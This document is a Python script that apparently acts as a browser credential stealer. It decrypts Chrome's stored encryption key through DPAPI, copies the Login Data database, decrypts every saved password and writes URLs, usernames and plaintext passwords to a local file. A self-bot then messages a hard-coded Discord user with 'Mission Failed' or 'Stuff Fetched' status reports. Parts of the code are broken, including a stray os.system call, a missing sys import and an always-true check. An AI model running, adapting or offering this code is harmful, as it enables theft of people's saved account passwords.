import os
os.system("cmd /c 10 'type text.txt'")
print("hi")

import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from pathlib import Path
from datetime import timezone, datetime, timedelta

feedbackbot = str(sys.argv[0])

def chrome_date_and_time(chrome_data):
    # Chrome_data format is 'year-month-date 
    # hr:mins:seconds.milliseconds
    # This will return datetime.datetime Object
    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)
  
  
def fetching_encryption_key():
    # Local_computer_directory_path will look 
    # like this below
    # C: => Users => <Your_Name> => AppData =>
    # Local => Google => Chrome => User Data =>
    # Local State
    local_computer_directory_path = os.path.join(
      os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", 
      "User Data", "Local State")
      
    with open(local_computer_directory_path, "r", encoding="utf-8") as f:
        local_state_data = f.read()
        local_state_data = json.loads(local_state_data)
  
    # decoding the encryption key using base64
    encryption_key = base64.b64decode(
      local_state_data["os_crypt"]["encrypted_key"])
      
    # remove Windows Data Protection API (DPAPI) str
    encryption_key = encryption_key[5:]
      
    # return decrypted key
    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]
  
  
def password_decryption(password, encryption_key):
    try:
        iv = password[3:15]
        password = password[15:]
          
        # generate cipher
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
          
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        this("Mission Failed. We'll get'em next time. ( Decryption )")
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            this("Mission Failed. We'll get'em next time. ( No Passwords )")
            return "No Passwords"
  
  
def main():
    key = fetching_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "ChromePasswords.db"
    shutil.copyfile(db_path, filename)
      
    # connecting to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()
      
    # 'logins' table has the data
    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
        "order by date_last_used")
      


    user = os.environ["USERPROFILE"]
    touser = user.strip("C:\\")
    print(touser)
    oof = """\ """
    theone = oof.strip(' ')
    newuser = touser.replace(theone, '_')
    print(newuser)
    datapath = os.path.dirname(f'Data\\{newuser}\\Fetched.txt')
    print(datapath)

    if not os.path.exists(datapath):
        os.makedirs(datapath)

    with open(f'Data\\{newuser}\\Fetched.txt', 'a') as f:
        # iterate over all rows
        for row in cursor.fetchall():
            main_url = row[0]
            login_page_url = row[1]
            user_name = row[2]
            decrypted_password = password_decryption(row[3], key)
            date_of_creation = row[4]
            last_usuage = row[5]
            
            if user_name or decrypted_password:
                f.write(f"Main URL: {main_url}\n")
                #print(f"Main URL: {main_url}")
                f.write(f"Login URL: {login_page_url}\n")
                #print(f"Login URL: {login_page_url}")
                f.write(f"User name: {user_name}\n")
                #print(f"User name: {user_name}")
                f.write(f"Decrypted Password: {decrypted_password}\n")
                #print(f"Decrypted Password: {decrypted_password}")
            
            else:
                continue
            
            if date_of_creation != 86400000000 and date_of_creation:
                f.write(f"Creation date: {str(chrome_date_and_time(date_of_creation))}\n")
                #print(f"Creation date: {str(chrome_date_and_time(date_of_creation))}")
            
            if last_usuage != 86400000000 and last_usuage:
                f.write(f"Last Used: {str(chrome_date_and_time(last_usuage))}\n")
                #print(f"Last Used: {str(chrome_date_and_time(last_usuage))}")
            f.write("=" * 100)
            f.write("\n")
            f.write("\n")
            #print("=" * 100)
        cursor.close()
        db.close()
      
    try:
          
        # trying to remove the copied db file as 
        # well from local computer
        os.remove(filename)
        this("Stuff Fetched. Easy Clutch")

    except:
        this("Mission Failed. We'll get'em next time. ( Main )")
        pass



import discord
from discord.ext import commands

bot = commands.Bot(command_prefix='?')

global val

val = "Nothing"

def this(outcome):

    val = outcome
    print("lol")

    @bot.event
    async def on_ready():

        #print(' [!] Started Dmming Ids\n')


        member = await bot.fetch_user("494048155286110208")
        try:
            await member.send(val)
            #print(f" [+] Sent message / 1")

            msg = await bot.wait_for('message', check = lambda x: x.channel == member.dm_channel and x.author == member)
            if msg == "shutdown" or "s" or "logout" or "log out" or "nice" or "noice":
                await member.send("Farewell Soldier :fist:")
                await bot.logout()
        except Exception as e:
            #print(f" [!] {e}")
            print("")

        #print(" [+] Done")
    
    bot.run(feedbackbot, bot = False)

if __name__ == "__main__":
    main()